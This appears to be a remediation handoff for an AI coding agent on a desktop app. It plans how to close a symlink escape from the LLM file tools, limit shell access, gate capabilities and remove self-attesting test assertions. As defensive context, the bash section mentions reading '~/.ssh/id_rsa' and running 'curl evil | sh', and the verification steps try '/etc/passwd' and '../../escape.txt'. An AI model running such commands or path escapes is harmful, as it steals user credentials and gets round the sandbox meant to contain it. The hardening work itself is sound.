# Codex Remediation Round 3 — 2026-04-29

> **范围**：上一轮（commits `3343afe5` → `b71bd2ad`）已经修掉 SOP 假完成、blocked-step 分桶、kanban 状态机、harness 反自证骨架、gateway lane 注入 fs/shell。本轮 simplify-plus 4-agent 复审在 `builtin_tools.rs` / 新 harness scenario / kanban CAS / 重复源 4 个面上发现剩余问题。本 doc 是给 codex round 3 的 handoff，**单次 multi-hour run** 走完。
>
> **对照前作**：`Docs/04_runtime_experience/CODEX_REMEDIATION_2026-04-29.md`、`CODEX_HANDOFF_2026-04-28.md`。本 doc 的反模式硬规则**继承**前作 Section 0，并补 R3-only 的两条。
>
> **核心：上一轮把"假完成"修掉了，这一轮要把"假沙箱"修掉。**

---

## Section 0 — Anti-Pattern Hard Rules（继承 + 增量）

继承前作 10 条全部仍生效。R3 补：

11. **沙箱声明必须真**。任何被声明 "bound to projects.workspace_root" 的命令，必须在 canonicalized 路径上做 prefix check，并在所有写操作（包括隐式的 `mkdir -p parent`）发生**之前**完成校验；不允许"先操作再 canonicalize"。lexical `starts_with` on un-canonicalized path = 不算 sandbox。
12. **错误信息不许向 LLM 泄漏 host-side 绝对路径**。任何返回给 JS 的 error string 里，若出现 `/Users/...` 段，按"路径泄漏"处理；统一用相对路径或 stable error code。

> 触线即视为 R3 任务未完成。**FakeGateway exhausted** / mock-content==assertion-string / `expectError` 子串通过 / 隐藏 fallback 假完成的 11 条老规则同样仍然生效，不再重述。

---

## Phase A — 沙箱诚实化（builtin_tools.rs）

**目标**：把 `apps/desktop/src-tauri/src/builtin_tools.rs` 从"声称沙箱实际可逃逸"修成"和声称一致 + 真正诚实"。

### A.1 写路径符号链接逃逸（BLOCKING）

**File**: `apps/desktop/src-tauri/src/builtin_tools.rs:122-151`

**当前流**：
```rust
ensure_inside_workspace(&candidate, &roots)?;       // 字面 starts_with，未 canonicalize
if let Some(parent) = candidate.parent() {
    ensure_inside_workspace(parent, &roots)?;       // 同样字面
    tokio::fs::create_dir_all(parent).await?;       // 逃逸点 1：可顺着 symlink 创建到 bound 外
    let canonical_parent = parent.canonicalize()?;
    ensure_inside_workspace(&canonical_parent, &roots)?;  // 太晚，目录已建
}
if candidate.exists() { /* canonicalize 兜底 */ }
tokio::fs::write(&candidate, content)?;             // 逃逸点 2：tokio::fs::write 跟随 symlink 写到 bound 外
```

**触发**：workspace_root 内任意一个软链（`node_modules/.bin` 之类）指向 bound 外，LLM 写 `that-link/evil` 即可落到 bound 外。

**修法（强制）**：
- 抽工具 `fn deepest_existing_ancestor(path: &Path) -> PathBuf`：从 candidate 往上回溯，返回**第一个存在的祖先**（含自身，若已存在）。
- 写之前：canonicalize 这个祖先 → 验在 roots 内 → 再把 candidate 的"非存在尾巴"语法 join 上去（不允许任何 `..` / 绝对、由 `resolve_candidate` 已保证）→ 用 join 后的路径 `tokio::fs::create_dir_all(parent)` → `tokio::fs::write(&full, content)`。
- 写完后再 canonicalize 一次实际写入路径，再次 `ensure_inside_workspace`；不一致就 `tokio::fs::remove_file` 回滚 + 报错。
- 同步修 `project_read_file`（line 113-119）：先 canonicalize 再 prefix check 已经做了，但要补 symlink-final-target check（macOS canonicalize 解 symlink 一次还不够时用 `std::fs::canonicalize` 真解或 `is_symlink` 挡）。

**Invariant scenario**：新增 `harness/scenarios/builtin-tools-rejects-symlink-escape.json`，断言写到 `workspace_root/link/x` 时（其中 `link → /tmp`）返回 `path is outside bound project workspaces`。

### A.2 workspace_root 黑名单（IMPORTANT）

**File**: `builtin_tools.rs:32-58 workspace_roots`

**问题**：`projects.workspace_root` 是用户 picker 选的，没有 sanity check。玩家若手动把 row 改成 `/` 或 `$HOME`，LLM 立即拿到全盘。

**修法**：在 `workspace_roots()` 把以下绝对路径**剔除并记 logger.warn**（不抛错，避免一条坏 row 锁死全部工具）：
- `/`、`/Users`、`/home`、`/etc`、`/var`、`/tmp`、`/usr`、`/opt`、`/private`
- 当前用户 home dir（用 `dirs::home_dir()`，剔除 home 本身和直接父级）
- 长度 ≤ 1 段的根（深度 < 2）

**Invariant scenario**：`builtin-tools-rejects-overbroad-root.json`，seed 一个 `workspace_root='/'`，断言 `project_read_file` 返回 `no project workspace_root is bound`（因 sanitize 后为空）。

### A.3 bash 不再 `-l`（IMPORTANT）

**File**: `builtin_tools.rs:167-168`

**当前**：`Command::new("bash").arg("-lc").arg(cmd)`

**问题**：`-l` 加载 login profile（`~/.bash_profile`、`/etc/profile`、`nvm`、`brew shellenv`、`mise`），50-200ms × N 调用 + 把用户的 alias / 缓存的 sudo / 自定义 PATH 全继承给 LLM 子进程。

**修法**：
- 改成 `bash -c`。
- 如果 LLM 任务确实需要 PATH（pnpm / node 找不到），在 Rust 端**一次性**快照 `~/.zprofile` 或 `~/.bash_profile` 的 PATH（启动时 spawn `bash -lc 'echo $PATH'` 读一次缓存到 Tauri managed state），后续 `bash -c` 调用通过 `.env("PATH", cached)` 显式注入。
- spec / handoff 写明：bash 不是任意命令沙箱，**只 cwd-bound**；任意命令仍可读 `~/.ssh/id_rsa` / `curl evil | sh`。这是 LLM agent 的本质 trade-off，不许声称 sandbox。

### A.4 文件大小上限（IMPORTANT）

**File**: `builtin_tools.rs:117 read_to_string` / `:148 fs::write`

**修法**：
- read：先 `fs::metadata(&canonical).await?`，若 `metadata.len() > MAX_READ_BYTES`（建议 8 MiB）→ 错误 `file too large to read in-process: <relative_path> (<size>B > <limit>B)`，不返回 `/Users/...`。
- write：`if content.len() > MAX_WRITE_BYTES` 同上挡（建议 8 MiB）。
- 把 `MAX_READ_BYTES` / `MAX_WRITE_BYTES` 做成 `const` 紧贴 `DEFAULT_MAX_OUTPUT_BYTES`，方便调。

**Invariant scenario**：`builtin-tools-rejects-oversize-read.json` / `builtin-tools-rejects-oversize-write.json`。

### A.5 错误信息去绝对路径（IMPORTANT）

**File**: `builtin_tools.rs:79-90 ensure_inside_workspace`、所有 `format!("...: {err}")`

**问题**：`format!("path is outside bound project workspaces: {}", candidate.to_string_lossy())` 把完整 host 路径回弹给 LLM。`io::Error` 在 macOS / Linux 的 Display 也会带 path。

**修法**：
- 抽 `fn relativize_for_error(path: &Path, roots: &[PathBuf]) -> String`：若 path 在某 root 下，返回 `<root_basename>/<rel>`；否则返回字面 `<out-of-bounds>`，**不返回完整绝对路径**。
- 所有面向 JS 的 error string 走 `relativize_for_error` 包裹；`io::Error` 走 `err.kind()` 而非 `err.to_string()`。
- 内部 logger（`logger.error(...)`）保留完整路径，便于本地 debug；只对 LLM-facing 字符串脱敏。

---

## Phase B — Tauri Capability Gate（POLICY DECISION → 默认决策已定）

**File**: `apps/desktop/src-tauri/capabilities/default.json`、`apps/desktop/src-tauri/src/lib.rs:319-321`

**现状**：`project_read_file` / `project_write_file` / `bash_execute` 注册到 `invoke_handler` 后默认对 main window 可见，没有独立 capability gate。和已有的 `claude_agent_execute` / `codex_agent_execute` 一致（也都没 gate）。

**风险口径**：本地 webview 只跑 `apps/web` 自己 build 出来的产物，理论上是可信内容；真正风险来源是渲染层 XSS（markdown 渲染器吃下 LLM 输出 / vendor 文档预览 / 第三方 iframe）。当 webview 被 hijack 后，无 capability gate = 直接 host shell。

**默认决策（除非你回我别的口径，按这条做）**：
- 给 fs/shell 三命令独立 capability：新建 `apps/desktop/src-tauri/capabilities/fs-shell.json`，identifier `offisim:fs-shell`，windows 限 `["main"]`，permissions 列具体三命令。
- 同时给 `claude_agent_execute` / `codex_agent_execute` / `llm_fetch` 同样的 main-window-only capability（identifier `offisim:agent-bridges`），不再依赖 `core:default` 的隐式可见。
- `default.json` 只保留通用基础（fs/sql/dialog/opener/cors-fetch/deep-link/single-instance），新建的命令必须显式 import。
- 不要扩散到所有窗口（如有 child window 用 `windows: ["main"]` 严格限制）。

**Invariant**：在 `apps/desktop/src-tauri/tests/`（如不存在则跳过）或文档中 spot-check capability load 后 `tauri::test::mock_app` 可以从 main window invoke 三命令、从其他 window invoke 应失败。这部分如果 Tauri test infra 不便，写在 `Docs/04_runtime_experience/EXECUTION_REPORT_2026-04-29.md` 的 verification section 即可。

---

## Phase C — Harness Self-Attest 残留清理

**目标**：CLAUDE.md 反自证规则 (`不要用 LLM mock content 等于 finalOutputContains`) 字面落地。当前 4 个 scenario 仍有 mock content === assertion 字符串，即使旁边有真断言，也违反硬规则。

### C.1 清理 4 个 scenario 的 self-attest 断言

**Files**:
- `packages/core/harness/scenarios/yolo-mode-skips-boss-chain.json:16,22`
- `packages/core/harness/scenarios/permission-ask-approved-blocks-and-then-executes.json:55,112`
- `packages/core/harness/scenarios/completion-verifier-persists-blocked-status.json:33,58`
- `packages/core/harness/scenarios/skill-create-real-tool-call.json:42,103`

**两选一**：
- **(a) 删除 self-attest assertion**：保留 `firstGraphNodeIs` / `taskRunStatusIs` / `interactionHistoryContains` / `toolExecutions` 等结构断言，删 `finalOutputContains: <mock-string>` 那条。`content` 里的字符串本身可以保留（FakeGateway 需要返回点东西），但断言不要再 round-trip 它。
- **(b) 换成产品代码生成的真字符串**：例如 verifier-block 路径的 final summary 是 boss-summary-node 真生成的 `Task processing complete.` / `Task blocked: <reason>`。把 assertion 改成断言这条产品字符串，确保 mock 不能直接 round-trip。

**判断**：
- `yolo-mode-skips-boss-chain` → 选 (a)。`firstGraphNodeIs: yolo-master` 已经够强。
- `permission-ask-approved-blocks-and-then-executes` → 选 (a)。`interactionHistoryContains` 真覆盖 approval 路径。
- `completion-verifier-persists-blocked-status` → 选 (b)。改成断言 boss-summary 生成的 `Task blocked` / `review_ready` UI 文案，因为这条 scenario 的核心就是 verifier-block 后 final output。
- `skill-create-real-tool-call` → 选 (a)。`toolExecutions: count: 0` + `interactionHistoryContains` 已覆盖。

### C.2 增量 invariant：禁止 self-attest 断言（CI guard）

**File**: `scripts/harness-contract.mjs`

加一条 **load-time** lint：扫所有 scenario，如果某条 `assertions[]` 是 `finalOutputContains` 且 `contains` 字符串等于某条 `llmTurns[].content`（完全相等，不算子串），fail-load。CLAUDE.md 反自证规则才有牙。

---

## Phase D — Kanban Atomicity（IMPORTANT）

### D.1 TS 端 CAS

**File**: `packages/core/src/runtime/repos/kanban-repo.ts:67-87 transition`

**当前**：read by id → 校验 transition → `storage.update(id, patch)`。两步之间无锁、无 CAS。

**修法**：
- `KanbanRepoStorage` 接口加 `compareAndUpdate(id, expectedState, patch): Promise<KanbanCardRow | null>`。返回 `null` 表示 stale read（id 不存在或 state 已变）。
- drizzle 后端实现：单条 `UPDATE kanban_cards SET ... WHERE id = ? AND state = ?` + 检查 `rowsAffected`。
- memory 后端实现：原子 `if current.state === expected → mutate`。
- tauri-repos 后端：调用 D.2 的 Rust 命令。
- `transition()` 调 `compareAndUpdate(id, current.state, patch)`；若返回 null → 重新 `findById` → 抛 `KanbanInvalidTransitionError(actual.state, next)` 或新加 `KanbanStaleTransitionError`，**不要静默成功**。

### D.2 Rust 端 CAS

**File**: `apps/desktop/src-tauri/src/kanban.rs:259-318 transition_kanban_card`

**修法**：UPDATE 加 `WHERE id = ? AND state = ?`。`execute().await?.rows_affected()` 为 0 时回 SELECT 一遍当前 state，返回 `Err("kanban transition stale: <id> moved from <expected> to <actual>")`。

### D.3 Invariant scenario

新增 `harness/scenarios/kanban-rejects-stale-transition.json`：
1. 同一个 cardId 两个并发 `transition('todo', 'doing')` + `transition('todo', 'review')`。
2. 一个成功、一个抛 stale；最终 state 是其中一个，不是 `todo`，不是 last-write-wins 的随机一个。

---

## Phase E — 双源真相消除（IMPORTANT）

### E.1 Kanban 状态机表 SSOT

**Files**:
- `packages/core/src/runtime/repos/kanban-repo.ts:5-11 ALLOWED_TRANSITIONS`
- `apps/desktop/src-tauri/src/kanban.rs:58-79 is_allowed_transition`
- `packages/shared-types/src/kanban.ts`（已经有 `KANBAN_STATES` / `KANBAN_ORIGINS` 常量）

**修法**（二选一）：
- **(a) 单文件 JSON**：在 `packages/shared-types/src/kanban-state-machine.json` 落 `{ "transitions": { "todo": ["doing","blocked","review","done"], ... } }`；TS 端 import json，Rust 端 build script (`build.rs`) 在 `OUT_DIR` 生成 `static ALLOWED_TRANSITIONS: &[(&str,&str)] = &[...]` include 进去。
- **(b) Rust 主、TS 派生**：写 cargo 命令 `cargo run --bin emit-kanban-table` 输出 JSON 到 `packages/shared-types/src/generated/`，commit 到仓；TS import 它。

推荐 (a)（更简单 + 没有 cargo 依赖跨包链）。

**验证**：harness `kanban-card-state-transitions` scenario 已经覆盖核心；新增 1 个 lint scenario 或 contract 校验（`scripts/harness-contract.mjs`）：load 时把 TS 表和 Rust 表（通过 generated json 对比）做 set equality，不一致 fail。

### E.2 `open_pool` SSOT

**Files**:
- `apps/desktop/src-tauri/src/builtin_tools.rs:20-30`
- `apps/desktop/src-tauri/src/sessions.rs:42-52`
- `apps/desktop/src-tauri/src/resume.rs:33-43`

**修法**：抽到 `apps/desktop/src-tauri/src/local_db.rs`（如果已有 `local_paths.rs` 也可以放进去）。导出 `pub async fn open_offisim_pool<R: Runtime>(app: &tauri::AppHandle<R>) -> Result<sqlx::SqlitePool, String>`。三处 import 它。同时见 Phase F.1，要把 `pool.close().await` 拿掉，改成进程级共享 pool。

### E.3 Path util 复用

**File**: `apps/web/src/lib/tauri-runtime.ts:163-167`

**当前**：手写 `isAbsolutePath` / `joinPath`，只判断 leading `/`，Windows 路径格式坏。

**修法**：用 `@offisim/core` 现有的 fs adapter 路径规范化（如 `packages/core/src/services/path-utils.ts` / shared-types fs helper），或直接用 `@tauri-apps/api/path` 的 `join` / `isAbsolute`。Tauri 模式下推荐后者；web 模式下 stub 走 `path-browserify` polyfill。

---

## Phase F — Hot-Path Efficiency（IMPORTANT）

### F.1 SQLite pool 缓存（取代每次 open/close）

**Problem**：`builtin_tools.rs` 里每个 fs/shell 调用都 `open_pool → query → close`，LLM 频繁调用 read_file 时一秒几十次。kanban / sessions / resume 也这样。

**修法**：
- 在 `apps/desktop/src-tauri/src/lib.rs` 启动早期（紧跟 `tauri-plugin-single-instance.init()` 之后）`app.manage(OffisimDbState { pool: pool_clone })`，pool 用 `SqlitePoolOptions::new().min_connections(1).max_connections(4)` 长期持有。
- `open_offisim_pool` 改名 `get_offisim_pool(app) -> &sqlx::SqlitePool`，内部走 `app.state::<OffisimDbState>()`。
- 所有 caller 移除 `pool.close().await`（pool 进程级管理）。
- migration 启动路径已经持有自己的 pool，不冲突；如果需要可让它复用。

**Invariant**：harness 不直接覆盖 desktop pool 行为；写到 `EXECUTION_REPORT_2026-04-29.md` 的 verification section（Computer Use 跑一轮 80-turn YOLO，验证 desktop activity monitor 里 sqlite open file count 不再线性增长）。

### F.2 Soak-runner streaming-reduce

**File**: `packages/core/src/testing/soak-runner.ts:100-160`

**当前**：`reports: ScenarioTraceReport[]` 全留在内存，每个 80-turn YOLO 跑完保留 trace+events+db snapshot。

**修法**：
- 引入 `RuntimeLeakSummary` 累加器：`{ totalIterations, leakingIterations: number, byCategory: Record<string, number>, sampleFailures: ScenarioTraceReport[] }`。
- 每跑完一个 iteration → 调 `summarizeRuntimeLeaks(report)` → 累加 → 失败的最多保留前 N 个（`SAMPLE_FAILURE_CAP = 5`），其余只记 count。
- `latencies: number[]` → 改成 t-digest / 简单分桶 histogram；保留 p50/p95/p99 计算能力即可。
- 80-turn × 100 iteration × concurrency=4 应能在 200MB heap 内跑完。

**Invariant**：新增 `harness/scenarios/soak-leak-detector-bounded-memory.json`（或扩展现有 `soak-leak-detector-catches-pending-assignment.json`）：iterations=20、concurrency=4，跑完后断言 `summary.sampleFailures.length <= SAMPLE_FAILURE_CAP`，且 `process.memoryUsage().heapUsed` 增量 < 100MB（用 `runtime.memory.snapshot.delta` 这类已有 invariant assertion 风格）。

### F.3 PM heartbeat short-circuit 前置

**File**: `packages/core/src/agents/pm-heartbeat-node.ts:45-77`

**当前**：每 tick 先 `repos.taskRuns.findByThread(threadId)` 全量扫 → 再 `repos.agentEvents.findByAgent('pm', ...)` → 才比较 progress 决定是否 emit。

**修法**：
- 状态对象 `state.pmHeartbeatLastSnapshot?: { dispatchedCount, completedCount, blockedCount, planSignature }` 已有就读，没有就加。
- tick 入口先比 `state.taskPlan?.steps.length` / `state.dispatchedStepIndices.length` / `state.completedStepIndices.length` / `state.blockedStepIndices.length` 与 lastSnapshot 是否完全相等 → 完全相等就 return state unchanged，**不**做 db 扫。
- 仅当 snapshot diff 时才 fetch taskRuns / agentEvents。
- 注意 LangGraph reducer 同 reference 返回 = no-op；`HeartbeatTickPayload` 改成 `{ ...state, pmHeartbeatLastSnapshot: nextSnapshot }` 仅在 diff 时返回。

### F.4 plan-persistence 并行化

**File**: `packages/core/src/agents/pm-planner/plan-persistence.ts:44-67,114-129`

**当前**：循环里 `await repos.taskRuns.create(...)`、`await repos.kanban.create(...)`，10 步计划 = 20 串行 await。

**修法**：
- `Promise.all(steps.map(step => repos.taskRuns.create(step)))` → 等 taskRuns 全部 ready；
- 然后 `Promise.all(steps.map((step,i) => repos.kanban.create({...step, task_run_id: taskRuns[i].id})))`；
- 注意 `sort_order` 字段顺序不依赖 await 顺序（kanban.create 已经接受 sort_order 入参）；如果 drizzle 后端有 unique 冲突，并行也安全因每条 row UUID 不重。
- 若 storage backend 文档明确串行（少见），保留串行但加注释说明原因。

---

## Phase G — Misc & Comments

### G.1 误导注释

**File**: `packages/core/src/agents/employee-completion.ts:139-141`

```ts
// SQLite task_runs.status CHECK excludes 'review_ready'; persist as 'blocked'
// while runtime/UI keep 'review_ready'.
const nextTaskRunStatus = completionOutcome.ok ? 'completed' : 'blocked';
```

**问题**：注释说"CHECK excludes review_ready"（事实），但接下来代码根本不写 `review_ready`，只在 `nextTaskState`（已被删）出现过；现在 next 是 `'completed' | 'blocked'`，注释脱节。

**修法**：保留信息但贴齐——把"这里不直接落 `review_ready` 的原因"挪到 `eventBus.emit(taskStateChanged(..., 'review_ready', ...))` 那行附近（line 174 附近），原 line 139-141 注释删掉或缩成单行 `// review_ready is a UI-only status, see eventBus emit below`。

### G.2 Stuck-task 类型字面量

**File**: `packages/core/src/agents/pm-heartbeat-node.ts:44`（与第三个值 `'stuck_task'` 在 line 86）

**修法**：
```ts
const STUCK_REASONS = ['verifier-blocked', 'running-too-long', 'stuck-task'] as const;
type StuckReason = (typeof STUCK_REASONS)[number];
```
改写所有 `'verifier-blocked' | 'running-too-long'` 内联类型，line 86 的 `'stuck_task'` 字面量改成 `'stuck-task'`（kebab-case 一致），bus payload 同步。

### G.3 mode-kanban-matrix 死字段

**File**: `packages/core/harness/scenarios/mode-kanban-matrix.json:4-7`

**问题**：`fixture.modes` / `fixture.task` 从未被 `runKanbanMatrixScenario` 读。

**修法**：删字段。或者让 runner 真消费它（更好，但不强求；本轮删字段就够）。

### G.4 已存在但未 surface 的良性现状（不修）

- `RecordingToolExecutor` 严格抛 `ToolFixtureMissing`（已 OK）
- `FakeGateway.assertTurnMatch` 严格抛（已 OK）
- `soak-runner` 真接 production graph（已 OK）
- `blockedStepIndices` / `completedStepIndices` 正交（已 OK）
- `isPlanFullyCompleted` 严格 `blocked === 0`（已 OK）

---

## Section 5 — Spec Sync Requirements

每条 phase 必须**同 commit** 更新对应 openspec spec。已有：
- `openspec/specs/interaction-modes/spec.md`
- `openspec/specs/kanban-data-pipeline/spec.md`
- `openspec/specs/long-running-runtime/spec.md`

补：
- **Phase A**：`interaction-modes/spec.md` 增加 "gateway-lane fs/shell tools sandbox honesty" 段，明文写：(1) write-path canonicalize before mkdir，(2) workspace_root blacklist，(3) bash 不是命令沙箱仅 cwd-bound，(4) 文件大小硬上限。spec 不写 `bash -lc` / `-c` 实现细节，但写"bash 不源 login profile"作为可观察行为。
- **Phase B**：`apps/desktop/src-tauri/CLAUDE.md`（如不存在则在 `apps/desktop/CLAUDE.md`）补 capability-gating 约定段：fs/shell + agent bridges 必须独立 capability、main-window-only。
- **Phase C**：`packages/core/CLAUDE.md` 反自证规则段加一句"`scripts/harness-contract.mjs` 在 load 时拒绝 self-attest assertion，违者 CI 红"。
- **Phase D**：`kanban-data-pipeline/spec.md` 加 "transition is atomic CAS" 不变量。
- **Phase E.1**：`kanban-data-pipeline/spec.md` 注脚指向 SSOT `kanban-state-machine.json`。
- **Phase F.3 / F.4**：性能不变量；不要在 spec 写硬性 ms 数字，写"not O(steps) per heartbeat" / "plan persistence rows insert in parallel batches"。

如果上一轮 `openspec/changes/` 有未 archive 的 R2 change，**先 archive R2**（按 `openspec/CLAUDE.md` archive gate 三查）再开 R3 的 change folder。R3 change 名建议 `2026-04-29-sandbox-honesty-and-kanban-cas`。

---

## Section 6 — Per-Commit Self-Check Commands

每次提交前必须全绿：

```bash
pnpm --filter @offisim/shared-types build
pnpm --filter @offisim/core typecheck
pnpm --filter @offisim/core build
pnpm --filter @offisim/db-local typecheck
pnpm --filter @offisim/web typecheck
pnpm lint                                  # exit 0
pnpm exec node scripts/harness-contract.mjs        # 全部 scenario load + run pass
pnpm exec node scripts/harness-replay.mjs          # graph + replay
pnpm exec node scripts/harness-soak.mjs --iterations 20 --concurrency 4   # bounded memory
git diff --check                           # no whitespace junk
```

Rust 改动必须额外：

```bash
cd apps/desktop/src-tauri && cargo check
cd apps/desktop/src-tauri && cargo clippy -- -D warnings    # 不要忽略
```

最后一个 phase commit 之后必须 release build：

```bash
pnpm --filter @offisim/desktop build       # 产 release .app + .dmg
```

---

## Section 7 — RC Live Verification（Computer Use）

**前提**：所有 phase 落地 + commit + release build 完成。Attach 到 release `Offisim.app`（`com.offisim.desktop` / `tauri://localhost`），不是 dev webview。

7 项必跑：

1. **创建 project + workspace_root**：picker 选一个真实空目录。screenshot 记录 path。
2. **direct-chat YOLO Master 执行 `read_file('README.md')`**：要求 LLM 真调 `read_file` 工具（而非"我没工具"），返回内容前 200 字节正确。
3. **direct-chat 写入 + 读回**：要求 LLM `write_file('scratch.txt', '...')` 后再 `read_file` 验证。
4. **direct-chat 越界拒绝**：手动让 LLM 试图 `read_file('/etc/passwd')` 或 `write_file('../../escape.txt', ...)`，验证返回错误**且错误信息不含 `/Users/...`**。
5. **direct-chat bash 超时**：`bash 'sleep 99'` with `timeout_ms: 1500`，验证 `timed_out: true` 返回。
6. **SOP boss-proxy 真完成**：用 SOP 触发 plan，每 step employee 真出 deliverable，boss summary 真带每个员工的 deliverable 引用，**不出现** "Task processing complete" 但实际 0 输出。
7. **kanban 状态机非法转换被拒**：UI 上拖 done → todo（如果 UI 暴露），或调试面板里手动 invoke `transition_kanban_card`，断言 `Err: invalid kanban transition: done -> todo`。

**全部记到** `Docs/04_runtime_experience/EXECUTION_REPORT_2026-04-29.md` 新增 R3 Section（保留 R2 Section）。

---

## Section 8 — Tag Gate

`v1.1.0-rc.1` 才能打的硬条件（在 R2 基础上累加）：

- ✅ 所有 R2 闭环（已完成）
- ☐ Phase A.1（write-symlink）真有 invariant scenario 且通过
- ☐ Phase A.2 / A.4 三条 over-broad / oversize scenarios 通过
- ☐ Phase B 决策落地（capability files 加完，`grep -r "tauri::generate_handler" apps/desktop/src-tauri/src` 与 capabilities 列表对账）
- ☐ Phase C self-attest CI guard 上线，4 个 scenario 清理完
- ☐ Phase D kanban CAS 真打到 SQL 层（grep `WHERE id = ? AND state = ?` 在 `kanban.rs` 出现）+ stale transition scenario
- ☐ Phase E.1 SSOT json + cross-check 上线
- ☐ Phase F.1 pool 改成 Tauri managed state（grep `app.state::<` 在 builtin_tools / kanban / sessions / resume 出现）
- ☐ Phase F.2 soak-runner 跑 100 iteration ≤ 200MB peak heap
- ☐ Section 7 七项 live verify 全过 + 报告里贴截图

**新 invariant scenario 计数 ≥ 8**（A.1, A.2, A.4 写 + A.4 读, C.2 contract guard, D.3, F.2, E.1 cross-check）。

---

## Section 9 — Hints & Anti-Drift

- **不要再开 `*.test.mjs`**（CLAUDE.md Validation Policy 明文禁止）。所有可观察不变量走 harness scenario。
- **不要为通过 lint 加 `// biome-ignore` 或 `eslint-disable`**。Lint 警告若是真的，把代码改对；若是 false positive 在 commit message 解释一句。
- **不要 `--no-verify`**，不要 amend 已 push 的 commit。
- **不要主动 archive R2 的 change folder**，只 archive 时机是"R2 已落地、R2 spec 三查通过、R3 已经基于 R2 spec 起步"。本次 round 3 起步前先确认上一轮 archive 已完成。
- **Phase 间允许 commit 多次**（preferred），不要把 R3 攒成一个巨型 commit。每个 phase 一个 commit + 标题前缀按 R2 风格：`fix(runtime): ...` / `feat(harness): ...` / `chore(desktop): ...`。
- **不要**借此轮做 unrelated cleanup。drive-by refactor、文件重排、依赖升级一律单独 PR。

---

## Codex Entry Command

```bash
cd /Users/haoshengli/Seafile/WebWorkSpace/Offisim && \
cat Docs/04_runtime_experience/CODEX_REMEDIATION_R3_2026-04-29.md && \
cat Docs/04_runtime_experience/CODEX_REMEDIATION_2026-04-29.md && \
cat Docs/04_runtime_experience/EXECUTION_REPORT_2026-04-28.md && \
cat CLAUDE.md && \
cat packages/core/CLAUDE.md && \
git log --oneline -20
```

读完按 Phase A → B → C → D → E → F → G 顺序推进，每个 phase 自检 + commit。最后一个 commit 之后跑 release build + Section 7 七项 Computer Use live verify。
